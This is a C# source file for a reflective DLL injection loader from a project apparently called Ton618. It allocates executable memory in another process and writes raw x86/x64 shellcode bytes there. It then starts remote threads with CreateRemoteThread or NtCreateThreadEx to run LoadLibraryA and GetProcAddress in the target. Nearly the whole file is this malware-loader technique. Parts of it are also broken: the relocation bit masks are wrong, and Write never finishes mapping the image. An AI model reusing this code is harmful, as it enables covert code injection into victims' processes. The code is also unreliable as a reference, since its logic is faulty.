using Q3C273.Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms.VisualStyles;
using Ton618.Utilities;
using Ton618.Utilities.PE;
using static Ton618.Utilities.ClientNatives;

namespace Ton618.Loader
{
    internal class ImageRelocator
    {
        private readonly byte[] imageBytes;
        private readonly int imageSize;
        private PEImage pe;

        public ImageRelocator(byte[] image)
        {
            imageBytes = image;
            imageSize = image.Length;
            this.pe = PEImage.ReadFromMemory(image, IntPtr.Zero, image.Length);
            if (this.pe == null)
                throw new InvalidOperationException("PE image failed to parse"); // TODO: Handle this
        }

        public ReflectiveSpecific Check(IntPtr processHandle)
        {
            var specifics = ReflectiveSpecific.None;
            if (!pe.DllCharacteristics.HasFlag(DllCharacteristicsType.IMAGE_DLLCHARACTERISTICS_NX_COMPAT))
                specifics |= ReflectiveSpecific.NOT_NX_COMPAT;
            if (!IsWow64Process(processHandle, out var x86) // Failed to get target process bits
                || pe.Is64Bitness == x86 // My DLL is 64-bit and the target process is 32-bit (or vice versa)
                || (IntPtr.Size == 4) == pe.Is64Bitness // Current process is 32-bit and My DLL is 64-bit (or vice versa)
                || (IntPtr.Size == 4) != x86) // Current process is 32-bit and the target process is 64-bit (or vice versa)
                specifics |= ReflectiveSpecific.INCOMPATIBLE_BITS;
            if (!pe.DllCharacteristics.HasFlag(DllCharacteristicsType.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE))
                specifics |= ReflectiveSpecific.NOT_ASLR_COMPAT;

            return specifics;
        }

        public int Write(IntPtr processHandle)
        {
            var specifics = Check(processHandle);
            if (specifics.HasFlag(ReflectiveSpecific.INCOMPATIBLE_BITS))
                return 1;

            var remoteMemAddr = IntPtr.Zero;
            if (specifics.HasFlag(ReflectiveSpecific.NOT_ASLR_COMPAT))
                remoteMemAddr = (IntPtr)pe.OriginalImageBase;

            var localMem = VirtualAlloc(
                IntPtr.Zero,
                (UIntPtr)pe.SizeOfImage,
                AllocationType.COMMIT | AllocationType.RESERVE,
                PageAccessRights.PAGE_READWRITE);

            var remoteMem = VirtualAllocEx(
                processHandle,
                remoteMemAddr,
                (UIntPtr)pe.SizeOfImage,
                AllocationType.COMMIT | AllocationType.RESERVE,
                PageAccessRights.PAGE_EXECUTE_READWRITE);
            if (remoteMem == IntPtr.Zero)
                return 2;

            // Copy headers (they're always consistent and only contains 'relative' addresses thus we don't need to touch them)
            Marshal.Copy(imageBytes, 0, localMem, (int)pe.SizeOfHeader);

            CopySections(localMem);

            return 0;
        }

        // Copy-Sections
        private void CopySections(IntPtr localStartAddress)
        {
            foreach (var section in pe.EnumerateSections())
            {
                var dest = localStartAddress.uplusptr(section.VirtualAddress);
                var data = section.PointerToRawData;
                var rawSize = section.SizeOfRawData;
                if (data == 0)
                    rawSize = 0;

                var vsize = section.PhysicalAddressOrVirtualSize;
                if (rawSize > vsize)
                    rawSize = vsize;

                Marshal.Copy(imageBytes, (int)data, dest, (int)rawSize);

                if (rawSize < vsize)
                {
                    // Fill extra space with zero
                    SharedNatives.memset(dest.uplusptr(rawSize), 0, (uint)(vsize - rawSize));
                }
            }
        }

        // Update-MemoryAddresses
        private void UpdateMemoryAddresses(IntPtr localMem, IntPtr remoteMem, long originalBase)
        {
            if (originalBase == remoteMem.ToInt64() || pe.BaseRelocationDirectory.Size == 0)
                return; // Nothing to do

            var imageBaseRelocSize = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
            var baseDifference = 0l;
            var subDifference = originalBase > remoteMem.ToInt64();
            if (subDifference)
                baseDifference = originalBase - remoteMem.ToInt64();
            else
                baseDifference = remoteMem.ToInt64() - originalBase;
            IntPtr baseRelocPtr = localMem.uplusptr(pe.BaseRelocationDirectory.VirtualAddress);
            var tableSize = pe.BaseRelocationDirectory.Size;
            while (tableSize > 0)
            {
                var baseRelocationTable = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(baseRelocPtr);
                if (baseRelocationTable.SizeOfBlock == 0)
                    break;

                var memAddrBase = localMem.uplusptr(baseRelocationTable.VirtualAddress);
                var numRelocations = (baseRelocationTable.SizeOfBlock - imageBaseRelocSize) / 2;
                for (int i = 0; i < numRelocations; i++)
                {
                    var relocationInfoPtr = baseRelocPtr + imageBaseRelocSize + (2 * i);
                    var relocationInfo = Marshal.PtrToStructure<ushort>(relocationInfoPtr);
                    var relocOffset = relocationInfo | 0x0FFF;
                    var relocType = (ImageRelocationType)(((relocationInfo | 0xF000) >> 12) & 0xF);
                    if (relocType == ImageRelocationType.IMAGE_REL_BASED_HIGHLOW | relocType == ImageRelocationType.IMAGE_REL_BASED_DIR64) // TODO: Support IMAGE_REL_BASED_HIGH IMAGE_REL_BASED_LOW
                    {
                        var finalAddr = memAddrBase + relocOffset;
                        var currAddr = Marshal.PtrToStructure<IntPtr>(finalAddr);
                        if (subDifference)
                            currAddr = new IntPtr(currAddr.ToInt64() - baseDifference);
                        else
                            currAddr = new IntPtr(currAddr.ToInt64() + baseDifference);
                        Marshal.StructureToPtr(currAddr, finalAddr, false);
                    }
                    else if (relocType != ImageRelocationType.IMAGE_REL_BASED_ABSOLUTE)
                        throw new Exception("Unknown relocation: " + relocType + " at relocationInfo: " + relocationInfo);
                }
                tableSize -= baseRelocationTable.SizeOfBlock; // Extra overflow protection layer
                baseRelocPtr = baseRelocPtr.uplusptr(baseRelocationTable.SizeOfBlock);
            }
        }

        // Import-DllImports
        private void ImportDllImports(IntPtr localMem, IntPtr remoteMem, IntPtr processHandle)
        {
            if (pe.ImportDescriptorTable.Size == 0)
                return;

            var importDescriptorPtr = localMem.uplusptr(pe.ImportDescriptorTable.VirtualAddress);
            while (true)
            {
                var importDescriptor = Marshal.PtrToStructure<IMAGE_IMPORT_DESCRIPTOR>(importDescriptorPtr);
                if (importDescriptor.Characteristics == 0 && importDescriptor.ForwarderChain == 0 && importDescriptor.Name == 0 && importDescriptor.TimeDateStamp == 0)
                    break; // Null-terminating IDT

                var importDllPathPtr = localMem.uplusptr(importDescriptor.Name);

                var importDllHandle = ImportDllInRemoteProcess(processHandle, importDllPathPtr);
                if (importDllHandle == null || importDllHandle == IntPtr.Zero)
                    throw new Exception("Import dll failed: " + Marshal.PtrToStringAnsi(importDllPathPtr));

                var thunkRef = localMem.uplusptr(importDescriptor.FirstThunk);
                var originalThunkRef = localMem.uplusptr(importDescriptor.Characteristics); //Characteristics is overloaded with OriginalFirstThunk
                var originalThunkRefVal = Marshal.PtrToStructure<IntPtr>(originalThunkRef);

                while (originalThunkRefVal != IntPtr.Zero)
                {
                    var byOrdinal = IntPtr.Size == 4 && originalThunkRefVal.ToInt32() < 0 || IntPtr.Size == 8 && originalThunkRefVal.ToInt64() < 0;
                    var procNamePtr = IntPtr.Zero;
                    var newThunkRef = IntPtr.Zero;
                    string procName = "";
                    if (!byOrdinal)
                    {
                        var stringAddr = new IntPtr(localMem.ToInt64() + originalThunkRefVal.ToInt64()) + Marshal.SizeOf<ushort>();
                        procName = Marshal.PtrToStringAnsi(stringAddr);
                        procNamePtr = Marshal.StringToHGlobalAnsi(procName);
                    }

                    newThunkRef = RemoteProcAddress(processHandle, importDllHandle, procNamePtr, byOrdinal);
                    if (newThunkRef == null || newThunkRef == IntPtr.Zero)
                    {
                        if (byOrdinal)
                            throw new Exception("New function ref null ptr=" + procNamePtr + " dll=" + Marshal.PtrToStringAnsi(importDllPathPtr));
                        else
                            throw new Exception("New function ref null name=" + procName + " dll=" + Marshal.PtrToStringAnsi(importDllPathPtr));
                    }

                    Marshal.StructureToPtr(newThunkRef, thunkRef, false);
                    thunkRef += Marshal.SizeOf<IntPtr>();
                    originalThunkRef += Marshal.SizeOf<IntPtr>();
                    originalThunkRefVal = Marshal.PtrToStructure<IntPtr>(originalThunkRef);

                    if (!byOrdinal && procNamePtr != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(procNamePtr);
                        procNamePtr = IntPtr.Zero;
                    }
                }

                importDescriptorPtr += Marshal.SizeOf<IMAGE_IMPORT_DESCRIPTOR>();
            }
        }

        private IntPtr ImportDllInRemoteProcess(IntPtr processHandle, IntPtr importDllPathPtr)
        {
            var ptrSize = Marshal.SizeOf<IntPtr>();
            var importDllPath = Marshal.PtrToStringAnsi(importDllPathPtr);
            var dllPathSize = (UIntPtr)(importDllPath.Length + 1);
            var rimportDllPathPtr = VirtualAllocEx(processHandle, IntPtr.Zero, dllPathSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
            if (rimportDllPathPtr == IntPtr.Zero)
                throw new Exception("Unable to allocate memory in the remote process for imported DLL path: " + importDllPath);

            var numBytesWritten = UIntPtr.Zero;
            var state = WriteProcessMemory(processHandle, rimportDllPathPtr, importDllPathPtr, dllPathSize, ref numBytesWritten);
            if (!state || numBytesWritten != dllPathSize)
                throw new Exception("Unable to fully write memory in the remote process for imported DLL path: " + importDllPath);

            var loadLibraryAddr = LookupPointer("kernel32.dll", "LoadLibraryA");

            var dllAddress = IntPtr.Zero;
            if (pe.Is64Bitness)
            {
                //For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
                //Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
                var loadLibraryARetMem = VirtualAllocEx(processHandle, IntPtr.Zero, dllPathSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);

                //Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
                var shellCode = new byte[][]
                {
                    new byte[] { 0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9 },
                    new byte[] { 0x48, 0xba },
                    new byte[] { 0xff, 0xd2, 0x48, 0xba },
                    new byte[] { 0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3 }
                };
                var shellCodeSize = shellCode.Sum(s => s.Length) + ptrSize * 3;

                var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
                var shellCodeMemOriginal = shellCodeMem;
                shellCodeMem.WriteBytes(shellCode[0]);
                shellCodeMem += shellCode[0].Length;
                Marshal.StructureToPtr(rimportDllPathPtr, shellCodeMem, false);
                shellCodeMem.WriteBytes(shellCode[1]);
                shellCodeMem += shellCode[1].Length;
                Marshal.StructureToPtr(loadLibraryAddr, shellCodeMem, false);
                shellCodeMem.WriteBytes(shellCode[2]);
                shellCodeMem += shellCode[2].Length;
                Marshal.StructureToPtr(loadLibraryARetMem, shellCodeMem, false);
                shellCodeMem.WriteBytes(shellCode[3]);

                var rscAddr = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);
                state = WriteProcessMemory(processHandle, rscAddr, shellCodeMemOriginal, (UIntPtr)shellCodeSize, ref numBytesWritten);
                if (!state || (UIntPtr)shellCodeSize != numBytesWritten)
                    throw new Exception("Failed to write LoadLibraryA shellcode to the target process memory");

                var threadHandle = CreateRemoteThreadAuto(processHandle, rscAddr, rimportDllPathPtr);
                if (WaitForSingleObject(threadHandle, 30000) != 0)
                    throw new Exception("Library loader thread didn't finished successfully. (or timeout)");

                var retValMem = Marshal.AllocHGlobal(ptrSize);
                state = ReadProcessMemory(processHandle, loadLibraryARetMem, retValMem, (UIntPtr)ptrSize, ref numBytesWritten);
                if (!state)
                    throw new Exception("Failed to read library base address after the library loader thread.");

                dllAddress = Marshal.PtrToStructure<IntPtr>(retValMem);
                VirtualFreeEx(processHandle, loadLibraryARetMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
                VirtualFreeEx(processHandle, rscAddr, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            }
            else
            {
                var threadHandle = CreateRemoteThreadAuto(processHandle, loadLibraryAddr, rimportDllPathPtr);
                if (WaitForSingleObject(threadHandle, 30000) != 0)
                    throw new Exception("Library loader thread didn't finished successfully. (or timeout)");

                state = GetExitCodeThread(threadHandle, out var exitCode);
                if (!state || exitCode == 0)
                    throw new Exception("Failed to read library base address after the library loader thread.");

                dllAddress = (IntPtr)exitCode;
            }

            VirtualFreeEx(processHandle, rimportDllPathPtr, UIntPtr.Zero, MemFreeType.MEM_RELEASE);

            return dllAddress;
        }

        private IntPtr CreateRemoteThreadAuto(IntPtr processHandle, IntPtr entryPoint, IntPtr paramPtr)
        {
            var threadHandle = IntPtr.Zero;
            if (Environment.OSVersion.Version > new Version(6, 0) && Environment.OSVersion.Version < new Version(6, 2)) // Windows Vista - 7
            {
                // Use NtCreateThreadEx
                var retVal = NtCreateThreadEx(ref threadHandle, 0x1FFFFF, IntPtr.Zero, processHandle, entryPoint, paramPtr, false, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);
                if (threadHandle == IntPtr.Zero)
                    throw new Exception("NtCreateThreadEx failed: return=" + retVal + ", win32Error=" + Marshal.GetLastWin32Error());
            }
            else
            {
                var tid = 0u;
                threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, UIntPtr.Zero, entryPoint, paramPtr, 0, ref tid);
                if (threadHandle == IntPtr.Zero)
                    throw new Exception("CreateRemoteThread failed: win32Error=" + Marshal.GetLastWin32Error());
            }
            return threadHandle;
        }

        private IntPtr RemoteProcAddress(IntPtr processHandle, IntPtr dllHandle, IntPtr funcNameOrOrdinal, bool byOrdinal)
        {
            bool state;
            var ptrSize = Marshal.SizeOf<IntPtr>();
            var rfuncNamePtr = IntPtr.Zero;
            if (byOrdinal)
            {
                var funcNameStr = Marshal.PtrToStringAnsi(funcNameOrOrdinal);
                var funcNamesize = (UIntPtr)(funcNameStr.Length + 1);
                rfuncNamePtr = VirtualAllocEx(processHandle, IntPtr.Zero, funcNamesize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
                if (rfuncNamePtr == IntPtr.Zero)
                    throw new Exception("Cannot allocate function name memory.");

                var numByteWritten = UIntPtr.Zero;
                state = WriteProcessMemory(processHandle, rfuncNamePtr, funcNameOrOrdinal, funcNamesize, ref numByteWritten);
                if (!state || funcNamesize != numByteWritten)
                    throw new Exception("Cannot fully write function name to the target process memory.");
            }
            else
                rfuncNamePtr = funcNameOrOrdinal;

            var getprocaddrRetMem = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)ptrSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_READWRITE);
            if (getprocaddrRetMem == IntPtr.Zero)
                throw new Exception("Cannot allocate target process memory for GetProcAddress result");

            var getprocaddr = LookupPointer("kernel32.dll", "GetProcAddress");

            byte[][] shellCode;
            if (pe.Is64Bitness)
            {

                shellCode = new byte[][] {
                    new byte[] { 0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9 },
                    new byte[] { 0x48, 0xba },
                    new byte[] { 0x48, 0xb8 },
                    new byte[] { 0xff, 0xd0, 0x48, 0xb9 },
                    new byte[] { 0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3 }
                };
            }
            else
            {
                shellCode = new byte[][] {
                    new byte[] { 0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8 },
                    new byte[] { 0xb9 },
                    new byte[] { 0x51, 0x50, 0xb8 },
                    new byte[] { 0xff, 0xd0, 0xb9 },
                    new byte[] { 0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3 }
                };
            }

            var shellCodeSize = shellCode.Sum(s => s.Length) + ptrSize * 4;
            var shellCodeMem = Marshal.AllocHGlobal(shellCodeSize);
            var shellCodeMemOriginal = shellCodeMem;
            shellCodeMem.WriteBytes(shellCode[0]);
            shellCodeMem += shellCode[0].Length;
            Marshal.StructureToPtr(dllHandle, shellCodeMem, false);
            shellCodeMem.WriteBytes(shellCode[1]);
            shellCodeMem += shellCode[1].Length;
            Marshal.StructureToPtr(rfuncNamePtr, shellCodeMem, false);
            shellCodeMem.WriteBytes(shellCode[2]);
            shellCodeMem += shellCode[2].Length;
            Marshal.StructureToPtr(getprocaddr, shellCodeMem, false);
            shellCodeMem.WriteBytes(shellCode[3]);
            shellCodeMem += shellCode[3].Length;
            Marshal.StructureToPtr(getprocaddrRetMem, shellCodeMem, false);
            shellCodeMem.WriteBytes(shellCode[4]);

            var shellCodeRMem = VirtualAllocEx(processHandle, IntPtr.Zero, (UIntPtr)shellCodeSize, AllocationType.COMMIT | AllocationType.RESERVE, PageAccessRights.PAGE_EXECUTE_READWRITE);
            if (shellCodeRMem == IntPtr.Zero)
                throw new Exception("Cannot allocate target process memory for shellcode");
            var shellCodesWritten = UIntPtr.Zero;
            state = WriteProcessMemory(processHandle, shellCodeRMem, shellCodeMem, (UIntPtr)shellCodeSize, ref shellCodesWritten);
            if (!state || shellCodesWritten != (UIntPtr)shellCodeSize)
                throw new Exception("Cannot fully write the GetProcAddress shellcode to the target process.");

            var threadHandle = CreateRemoteThreadAuto(processHandle, shellCodeRMem, IntPtr.Zero);
            if (WaitForSingleObject(threadHandle, 30000) != 0)
                throw new Exception("The GetProcAddress remote thread didn't finished successfully.");

            var retBuffer = Marshal.AllocHGlobal(ptrSize);
            state = ReadProcessMemory(processHandle, getprocaddrRetMem, retBuffer, (UIntPtr)ptrSize, ref shellCodesWritten);
            if (!state)
                throw new Exception("Cannot read GetProcAddress return value from the target process memory.");

            var procAddress = Marshal.PtrToStructure<IntPtr>(retBuffer);

            VirtualFreeEx(processHandle, shellCodeRMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            VirtualFreeEx(processHandle, getprocaddrRetMem, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            if (!byOrdinal)
                VirtualFreeEx(processHandle, rfuncNamePtr, UIntPtr.Zero, MemFreeType.MEM_RELEASE);
            Marshal.FreeHGlobal(retBuffer);

            return procAddress;
        }
    }

    [Flags]
    internal enum ReflectiveSpecific
    {
        None = 0,
        NOT_NX_COMPAT, // DLL doesn't support NX bits
        INCOMPATIBLE_BITS, // DLL and Target executable bit does not match. (ex: DLL is 64-bit, but the target process is 32-bit)
        NOT_ASLR_COMPAT, // DLL is not compatible with ASLR
    }
}
